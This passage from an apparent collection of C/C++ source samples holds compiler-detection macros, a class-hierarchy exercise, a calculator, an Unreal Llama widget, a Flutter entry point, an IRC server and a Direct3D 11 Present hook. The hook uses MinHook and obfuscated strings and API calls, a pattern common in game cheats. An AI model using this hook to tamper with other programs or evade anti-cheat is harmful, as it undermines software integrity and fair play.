defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__SUNPRO_CC)\n# define COMPILER_ID \"SunPro\"\n# if __SUNPRO_CC >= 0x5100\n   /* __SUNPRO_CC = 0xVRRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>12)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xFF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# else\n   /* __SUNPRO_CC = 0xVRP */\n#  define COMPILER_VERSION_MAJOR HEX(__SUNPRO_CC>>8)\n#  define COMPILER_VERSION_MINOR HEX(__SUNPRO_CC>>4 & 0xF)\n#  define COMPILER_VERSION_PATCH HEX(__SUNPRO_CC    & 0xF)\n# endif\n\n#elif defined(__HP_aCC)\n# define COMPILER_ID \"HP\"\n  /* __HP_aCC = VVRRPP */\n# define COMPILER_VERSION_MAJOR DEC(__HP_aCC/10000)\n# define COMPILER_VERSION_MINOR DEC(__HP_aCC/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__HP_aCC     % 100)\n\n#elif defined(__DECCXX)\n# define COMPILER_ID \"Compaq\"\n  /* __DECCXX_VER = VVRRTPPPP */\n# define COMPILER_VERSION_MAJOR DEC(__DECCXX_VER/10000000)\n# define COMPILER_VERSION_MINOR DEC(__DECCXX_VER/100000  % 100)\n# define COMPILER_VERSION_PATCH DEC(__DECCXX_VER         % 10000)\n\n#elif defined(__IBMCPP__) && defined(__COMPILER_VER__)\n# define COMPILER_ID \"zOS\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP__/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__IBMCPP__    % 10)\n\n#elif defined(__ibmxl__) && defined(__clang__)\n# define COMPILER_ID \"XLClang\"\n# define COMPILER_VERSION_MAJOR DEC(__ibmxl_version__)\n# define COMPILER_VERSION_MINOR DEC(__ibmxl_release__)\n# define COMPILER_VERSION_PATCH DEC(__ibmxl_modification__)\n# define COMPILER_VERSION_TWEAK DEC(__ibmxl_ptf_fix_level__)\n\n\n#elif defined(__IBMCPP__) && !defined(__COMPILER_VER__) && __IBMCPP__ >= 800\n# define COMPILER_ID \"XL\"\n  /* __IBMCPP__ = VRP */\n# define COMPILER_VERSION_MAJOR DEC(__IBMCPP__/100)\n# define COMPILER_VERSION_MINOR DEC(__IBMCPP_",
    "#include \"d3d_Hook.hpp\"\r\n\r\n#include <MinHook.h>\r\n\r\nbool Hook::Init()\r\n{\r\n\tconst std::string Title = E(\"SKYPE TERMINAL CALLING\");\r\n\r\n\tWNDCLASSEX Window;\r\n\r\n\tWindow.cbSize = sizeof(WNDCLASSEX);\r\n\tWindow.style = CS_HREDRAW | CS_VREDRAW;\r\n\r\n\tWindow.lpfnWndProc = DefWindowProcA;\r\n\tWindow.cbClsExtra = NULL;\r\n\tWindow.cbWndExtra = NULL;\r\n\tWindow.hInstance = SAFE_CALL(GetModuleHandleA)(nullptr);\r\n\tWindow.hIcon = NULL;\r\n\tWindow.hCursor = NULL;\r\n\tWindow.hbrBackground = NULL;\r\n\tWindow.lpszMenuName = NULL;\r\n\tWindow.lpszClassName = Title.c_str();\r\n\tWindow.hIconSm = NULL;\r\n\r\n\tSAFE_CALL(RegisterClassExA)(&Window);\r\n\r\n\tHWND WindowA = CreateWindowA(Window.lpszClassName, Title.c_str(), WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, 0, 0, Window.hInstance, 0);\r\n\r\n\tHMODULE D3D11_DLL;\r\n\tif ((D3D11_DLL = SAFE_CALL(GetModuleHandleA)(E(\"d3d11.dll\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tvoid* D3D11CreateDeviceAndSwapChain;\r\n\r\n\tif ((D3D11CreateDeviceAndSwapChain = SAFE_CALL(GetProcAddress)(D3D11_DLL, E(\"D3D11CreateDeviceAndSwapChain\"))) == NULL)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tD3D_FEATURE_LEVEL featureLevel;\r\n\tconst D3D_FEATURE_LEVEL featureLevels[] = { D3D_FEATURE_LEVEL_10_1, D3D_FEATURE_LEVEL_11_0 };\r\n\tDXGI_RATIONAL refreshRate;\r\n\trefreshRate.Numerator = 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "\ufeff#include <iostream>\r\n#include<vector>\r\nusing namespace std;\r\n\r\n\r\nclass ISuperSpeed abstract{\r\npublic:\r\n    virtual void SuperSpeed() = 0;\r\n    virtual ~ISuperSpeed() {};\r\n};\r\n\r\nclass ISuperPower abstract{\r\npublic:\r\n    virtual void SuperPower() = 0;\r\n    virtual ~ISuperPower() {};\r\n};\r\n\r\nclass IFly abstract {\r\npublic:\r\n    virtual void Fly() = 0;\r\n    virtual ~IFly() {};\r\n};\r\n\r\nclass IHighIntelect abstract{\r\npublic:\r\n    virtual void HaveIntelect() = 0;\r\n    virtual ~IHighIntelect() {};\r\n};\r\n\r\nclass ISayJokes abstract {\r\npublic:\r\n    virtual void SayJokes() = 0;\r\n    virtual ~ISayJokes() {};\r\n};\r\n\r\nclass IHaveLaserEye abstract {\r\npublic:\r\n    virtual void HaveLaserEye() = 0;\r\n    virtual ~IHaveLaserEye() {};\r\n};\r\n\r\nclass IHaveChuika abstract{\r\npublic:\r\n    virtual void HaveChuika() = 0;\r\n    virtual ~IHaveChuika() {};\r\n};\r\n\r\nclass IMakeLigtning abstract {\r\npublic:\r\n    virtual void MakeLigtning() = 0;\r\n    virtual ~IMakeLigtning() {};\r\n};\r\n\r\nclass Ability abstract : public IMakeLigtning, public IHaveChuika, public IHaveLaserEye, public ISayJokes, public IHighIntelect, public IFly, public ISuperPower, public ISuperSpeed {\r\npublic:\r\n    virtual ~Ability() {};\r\n    virtual void HaveChuika() override {\r\n        cout << \"I have chuika\\n\";\r\n    }\r\n    virtual void MakeLigtning() override {   \r\n        cout << \"I can make ligtning\\n\";\r\n    }\r\n    virtual void HaveLaserEye()override {\r\n        cout << \"I can shoot lasers by my eyes\\n\"; \r\n    }\r\n    virtual void SayJokes() override {\r\n        cout << \"I can say jokes\\n\";\r\n    }\r\n    virtual void Fly() override {\r\n        cout << \"I can fly\\n\";\r\n    }\r\n    virtual void HaveIntelect() override {\r\n        cout << \"I am very smart\\n\";\r\n    }\r\n    virtual void SuperPower() override {\r\n        cout << \"I am very strong\\n\";\r\n    }\r\n    virtual void SuperSpeed() override {\r\n        cout << \"I am very fast\\n\";\r\n    }\r\n};\r\n\r\nclass Good abstract {\r\npublic:\r\n    virtual void DoGoodThings(string thing) = 0;\r\n    virtual ~Good() {};\r\n};\r\n\r\nclass Bad abstract {\r\npublic:\r\n    virtual void DoBadThings(string thing) = 0;\r\n    virtual ~Bad() {};\r\n};\r\n\r\nclass God abstract : protected Ability {\r\n    /*string name;*/\r\n    int count = 0;\r\n    string life = \"infinity\";   \r\n    vector <void (Ability::*)()> abilities;     \r\npublic:\r\n    \r\n    God() {\r\n        //cout << \"God\\n\";\r\n    }\r\n\r\n    virtual ~God() {}\r\n\r\n    string GetLife()\r\n    {\r\n        return life;\r\n    }\r\n\r\n    int GetCount() {\r\n        return count;\r\n    }\r\n\r\n    void AddAbility(void(Ability::* ability)())\r\n    {\r\n        //void* method = *(void**)(&abilitie);\r\n        abilities.push_back(ability);\r\n        count++;\r\n    }\r\n\r\n    auto Search(void(Ability::* ability)())\r\n    {\r\n        for (int i = 0; i < count; i++)\r\n        {\r\n            if (ability == abilities[i]) {\r\n                return 1;\r\n            }\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    void ShowAbilities()\r\n    {\r\n        for (auto ability : abilities)\r\n        {\r\n            if (ability == &Ability::Fly)\r\n                cout << \"Fly \";\r\n            else if (ability == &Ability::HaveIntelect)\r\n                cout << \"High Intelect \";\r\n            else if (ability == &Ability::HaveChuika)\r\n                cout << \"Chuika \";\r\n            else if (ability == &Ability::HaveLaserEye)\r\n                cout << \"Laser eyes \";\r\n            else if (ability == &Ability::MakeLigtning)\r\n                cout << \"Throw Ligtning \";\r\n            else if (ability == &Ability::SayJokes)\r\n                cout << \"Say some jokes \";\r\n            else if (ability == &Ability::SuperPower)\r\n                cout << \"Super power \";\r\n            else if (ability == &Ability::SuperSpeed)\r\n                cout << \"Super speed \";\r\n            //(this->*ability)();\r\n        }\r\n        cout << \"\\n\";\r\n    }\r\n    \r\n};\r\n\r\nclass People abstract : protected Ability{ \r\n    /*string name;*/\r\n    int life;\r\n    vector <void (Ability::*)()> abilities;\r\n    int count = 0;\r\npublic:\r\n\r\n    People() {\r\n       // cout << \"People\\n\";\r\n    }\r\n\r\n    virtual ~People() {}\r\n\r\n    void SetLife(int life) {\r\n        this->life = life;\r\n    }\r\n\r\n    int GetLife() {\r\n        return life;\r\n    }\r\n    \r\n    int GetCount(){\r\n        return count;\r\n    }\r\n\r\n    auto Search(void(Ability::* ability)())\r\n    {\r\n        for (int i = 0; i < count; i++)\r\n        {\r\n            if (ability == abilities[i]) {\r\n                return 1;\r\n            }\r\n        }\r\n        return 0;\r\n    }\r\n\r\n    void AddAbility(void (Ability::* ability)()) {\r\n        abilities.push_back(ability);\r\n        count++;       \r\n    }\r\n\r\n    void ShowAbility() {\r\n        for (auto ability : abilities)\r\n        {\r\n            /*(this->*ability)();*/\r\n            if (ability == &Ability::Fly)\r\n                cout << \"Fly \";\r\n            else if (ability == &Ability::HaveIntelect)\r\n                cout << \"High Intelect \";\r\n            else if (ability == &Ability::HaveLaserEye)\r\n                cout << \"Laser eyes \";\r\n            else if (ability ==",
    "#include <iostream>\r\n#include <stack>\r\n#include <string>\r\n#include <sstream>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\nbool isOperator(char c) {\r\n\treturn c == '+' || c == '-' || c == '*' || c == '/' || c == '^' || c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q';\r\n}\r\n\r\nbool isDigit(char c) {\r\n\treturn c >= '0' && c <= '9';\r\n}\r\n\r\nbool isLeftParenthesis(char c) {\r\n\treturn c == '(';\r\n}\r\n\r\nbool isRightParenthesis(char c) {\r\n\treturn c == ')';\r\n}\r\n\r\nbool isWhiteSpace(char c) {\r\n\treturn c == ' ' || c == '\\t' || c == '\\n';\r\n}\r\n\r\nbool isInvalidChar(char c) {\r\n\treturn !isOperator(c) && !isDigit(c) && !isLeftParenthesis(c) && !isRightParenthesis(c) && !isWhiteSpace(c);\r\n}\r\n\r\nbool isOperatorHigherOrEqual(char op1, char op2) {\r\n\tif ((op1 == '*' || op1 == '/' || op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '+' || op2 == '-')) {\r\n\t\treturn true;\r\n\t}\r\n\tif ((op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '*' || op2 == '/')) {\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\ndouble calculate(double operand1, double operand2, char op) {\r\n\tswitch (op) {\r\n\t\tcase '+':\r\n\t\t\treturn operand1 + operand2;\r\n\t\tcase '-':\r\n\t\t\treturn operand1 - operand2;\r\n\t\tcase '*':\r\n\t\t\treturn operand1 * operand2;\r\n\t\tcase '/':\r\n\t\t\treturn operand1 / operand2;\r\n\t\tcase '^':\r\n\t\t\treturn pow(operand1, operand2);\r\n\t\tcase 's':\r\n\t\t\treturn sin(operand2 * M_PI / 180.0);\r\n\t\tcase 'c':\r\n\t\t\treturn cos(operand2 * M_PI / 180.0);\r\n\t\tcase 't':\r\n\t\t\treturn tan(operand2 * M_PI / 180.0);\r\n\t\tcase 'l':\r\n\t\t\treturn log(operand2);\r\n\t\tcase 'q':\r\n\t\t\treturn sqrt(operand2);\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\nbool evaluate(string expr, double& result) {\r\n\tstack<double> operands;\r\n\tstack<char> operators;\r\n\tint i = 0;\r\n\tint len = expr.length();\r\n\twhile (i < len) {\r\n\t\tchar c = expr[i];\r\n\t\tif (isWhiteSpace(c)) {\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isInvalidChar(c)) {\r\n\t\t\treturn false;\r\n\r\n\t\t}\r\n\t\tif (isDigit(c)) {\r\n\t\t\tdouble operand;\r\n\t\t\tstringstream ss;\r\n\t\t\tss << c;\r\n\t\t\ti++;\r\n\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\tss << expr[i];\r\n\t\t\t\ti++;\r\n\t\t\t}\r\n\t\t\tss >> operand;\r\n\t\t\toperands.push(operand);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isOperator(c)) {\r\n\t\t\tif (c == '-' && (i == 0 || isOperator(expr[i - 1]) || isLeftParenthesis(expr[i - 1]))) {\r\n\t\t\t\tdouble operand;\r\n\t\t\t\tstringstream ss;\r\n\t\t\t\tss << '-';\r\n\t\t\t\ti++;\r\n\t\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\t\tss << expr[i];\r\n\t\t\t\t\ti++;\r\n\t\t\t\t}\r\n\t\t\t\tss >> operand;\r\n\t\t\t\toperands.push(operand);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\twhile (!operators.empty() && isOperatorHigherOrEqual(operators.top(), c)) {\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isLeftParenthesis(c)) {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isRightParenthesis(c)) {\r\n\t\t\tif (operators.empty()) {\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tchar op = operators.top();\r\n\t\t\twhile (!isLeftParenthesis(op)) {\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\top = operators.top();\r\n\t\t\t}\r\n\t\t\toperators.pop();\r\n\t\t\tif (!operators.empty() && (operators.top() == 's' || operators.top() == 'c' || operators.top() == 't' || operators.top() == 'l' || operators.top() == 'q')) {\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble operand = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(0, operand, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q') {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t}\r\n\twhile (!operators.empty()) {\r\n\t\tchar op = operators.top();\r\n\t\toperators.pop();\r\n\t\tif (isLeftParenthesis(op) || operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand2 = operands.top();\r\n\t\toperands.pop();\r\n\t\tif (operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand1 = operands.top();\r\n\t\toperands.pop();\r\n\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\toperands.push(result);\r\n\t}\r\n\tif (operands.empty()) {\r\n\t\treturn false;\r\n\t}\r\n\tresult = operands.top();\r\n\treturn true;\r\n}\r\n\r\nint main() {\r\n\tstring expr;\r\n\tcout << \"input an expression: \";\r\n\tgetline(cin, expr);\r\n\tdouble result;\r\n\tif (evaluate(expr, result)) {\r\n\t\tprintf(\"%lf\\n\", result);\r\n\t} else {\r\n\t\tcout << \"illegal expression!\" << endl;\r\n\t}\r\n    cout<<\"press any key to continue...\";\r\n    getchar();\r\n\treturn 0;\r\n}\r\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"../Public/LlamaDialogueWidget.h\"\n\nULlamaDialogueWidget::ULlamaDialogueWidget(const FObjectInitializer& ObjectInitialize)\n\t:Super(ObjectInitialize)\n{\n\tOrder = 0;\n\tContent = TEXT(\"What can I do for you?\");\n\tprompts[0] = TEXT(\"What are the three primary colors?\");\n\tprompts[1] = TEXT(\"What does DNA stand for?\");\n\tprompts[2] = TEXT(\"Could you describe the composition of atoms briefly?\");\n\tprompts[3] = TEXT(\"Provide an example of a non-renewable source of energy.\");\n\tInferenceTask = new FLlamaInferenceTask(\"\", &Content, &Order);\n}\n\nbool ULlamaDialogueWidget::GetNextPrompt()\n{\n\tif (Order < 8)\n\t{\n\t\tContent = prompts[Order / 2];\n\t\tstd::string stdStr(TCHAR_TO_UTF8(*Content));\n\t\tInferenceTask->prompt = stdStr;\n\t\tOrder += 1;\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nvoid ULlamaDialogueWidget::LlamaInference()\n{\n\tContent = TEXT(\"generating...\");\n\tFRunnableThread::Create(InferenceTask, TEXT(\"InferenceTask\"), 0, TPri_Normal);\n}\n\n\n\n\n\n\n\n\n\n",
    "#include <iostream>\n#include <cstring>\n#include \"Constants.h\"\n#pragma warning(disable : 4996)\n\n\nbool checkIfCharIsSpace(char ch)\n{\n\tif (ch == ' ' || ch == '\\n' || ch == '\\t')\n\t{\n\t\treturn true;\n\t}\n\n\treturn false;\n}\nvoid removeSpaces(char* str)\n{\n\tint index = 0;\n\tchar tempStr[buffer1];\n\tint tempStrIndex = 0;\n\n\tbool spaceFlag = false;\n\twhile (str[index] != '\\0')\n\t{\n\t\tif (checkIfCharIsSpace(str[index]) && spaceFlag == false)\n\t\t{\n\t\t\ttempStr[tempStrIndex++] = ' ';\n\t\t\tspaceFlag = true;\n\t\t\tindex++;\n\t\t}\n\t\telse if (checkIfCharIsSpace(str[index]) && spaceFlag)\n\t\t{\n\t\t\tindex++;\n\t\t}\n\t\telse\n\t\t{\n\t\t\ttempStr[tempStrIndex++] = str[index++];\n\t\t\tspaceFlag = false;\n\t\t}\n\t}\n\n\ttempStr[tempStrIndex] = '\\0';\n\tstrcpy(str, tempStr);\n}\nint myAtoi(const char* str)\n{\n\tint index = 0;\n\tint result = 0;\n\n\twhile (str[index] != '\\0')\n\t{\n\t\tresult = result * 10 + (str[index] - '0');\n\t\tindex++;\n\t}\n\n\treturn result;\n}\nvoid changeChars(char* str)\n{\n\tint index = 0;\n\tchar tempStr[buffer1];\n\tint tempStrIndex = 0;\n\n\tbool ampsFlag = false;\n\twhile (str[index] != '\\0')\n\t{\n\t\tif (str[index] != '&')\n\t\t{\n\t\t\ttempStr[tempStrIndex++] = str[index++];\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (str[index] == '&')\n\t\t{\n\t\t\tampsFlag = true;\n\t\t\tindex = index + 2;\n\t\t\tchar code[NUM_BUFFER];\n\t\t\tint codeIndex = 0;\n\t\t\twhile (str[index] >= '0' && str[index] <= '9')\n\t\t\t{\n\t\t\t\tcode[codeIndex++] = str[index++];\n\t\t\t}\n\t\t\tcode[codeIndex] = '\\0';\n\n\t\t\ttempStr[tempStrIndex++] = myAtoi(code);\n\t\t}\n\t}\n\n\ttempStr[tempStrIndex] = '\\0';\n\tstrcpy(str, tempStr);\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"presensi_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   Server.cpp                                         :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: fgalan-r <fgalan-r@student.42malaga.com    +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/03/23 15:58:15 by fgalan-r          #+#    #+#             */\n/*   Updated: 2024/04/06 14:03:04 by fgalan-r         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"Server.hpp\"\n\nServer::Server(int port, std::string pass) : _port(port), _pass(pass)\n{\n\tstd::cout << \"Server created\" << std::endl;\n\tstd::cout << \"port: \" << _port << std::endl;\n\tstd::cout << \"pass: \" << _pass << std::endl;\n\t_signal = false;\n}\n\nServer::~Server()\n{\n\tstd::cout << \"Server deleted\" << std::endl;\n}\n\n// clear the clients\nvoid Server::clearClients(int fd)\n{\n\t// remove the client from the pollfd\n\tfor(size_t i = 0; i < _fds.size(); i++)\n\t{ \n\t\tif (_fds[i].fd == fd)\n\t\t{\n\t\t\t_fds.erase(_fds.begin() + i); \n\t\t\tbreak;\n\t\t}\n \t}\n\t// remove the client from the vector of clients\n \tfor(size_t i = 0; i < _users.size(); i++)\n\t{ \n\t\tif (_users[i].getFd() == fd)\n\t\t{\n\t\t\t_users.erase(_users.begin() + i); \n\t\t\tbreak;\n\t\t}\n \t}\n}\n\n// initialize the static boolean\nbool Server::_signal = false; \n\n\nvoid Server::signalHandler(int signum)\n{\n\t(void)signum;\n\tstd::cout << std::endl << \"Signal Received!\" << std::endl;\n\t// set the static boolean to true to stop the server\n\tServer::_signal = true;\n}\n\nint\tServer::validPort(const std::string port)\n{\n\tfor (size_t i = 0; i < port.length(); i++)\n\t{\n\t\tif (!std::isdigit(port[i]))\n\t\t\treturn (0);\n\t}\n\tint num = std::stoi(port);\n\t// Ports 0 to 1023 are reserved for specific services and protocols\n\tif (num < 1024 || num > 65535) \n\t\treturn (0);\n\treturn (1);\n}\n\nint\tServer::validPass(const std::string pass)\n{\n\tif (pass.length() > 8)\n\t\treturn (0);\n\treturn (1);\n}\n\nvoid Server::closeFds()\n{\n\t// close all the clients\n\tfor(size_t i = 0; i < _users.size(); i++)\n\t{ \n\t\tstd::cout << RED << \"Client [\" << _users[i].getFd() << \"] Disconnected\" << WHI << std::endl;\n\t\tclose(_users[i].getFd());\n\t}\n\t// close the server socket\n\tif (_serverFd != -1)\n\t{\n\t\tstd::cout << RED << \"Server [\" << _serverFd << \"] Disconnected\" << WHI << std::endl;\n\t\tclose(_serverFd);\n\t}\n}\n\nvoid Server::receiveNewData(int fd)\n{\n\tchar buff[1024]; \t\t\t\t// buffer for the received data\n\tmemset(buff, 0, sizeof(buff));\t// clear the buffer\n\n\tssize_t bytes = recv(fd, buff, sizeof(buff) - 1 , 0); // receive the data\n\t// check if the client disconnected\n\tif(bytes <= 0)\n\t{ \n\t\tstd::cout << RED << \"Client [\" << fd << \"] Disconnected\" << WHI << std::endl;\n\t\tclearClients(fd);\t// clear the client\n\t\tclose(fd);\t\t\t// close the client socket\n\t}\n \telse\n\t{\n\t\t// print the received data\n\t\tbuff[bytes] = '\\0';\n\t\tstd::cout << YEL << \"Client [\" << fd << \"] Data: \" << WHI << buff;\n\t\t// code to process the received data\n\t\tstd::string message = \"message received\\n\";\n\t\tsendMessage(fd, message);\n\t}\n}\n\nint Server::sendMessage(int fd, const std::string str)\n{\n\tif (send(fd, str.c_str(), str.length(), 0) == -1)\n\t{\n\t\tstd::cout << \"error sending message\" << std::endl;\n\t\treturn (1);\n\t}\n\treturn (0);\n}\n\nvoid Server::acceptNewUser()\n{\n\t// create a new 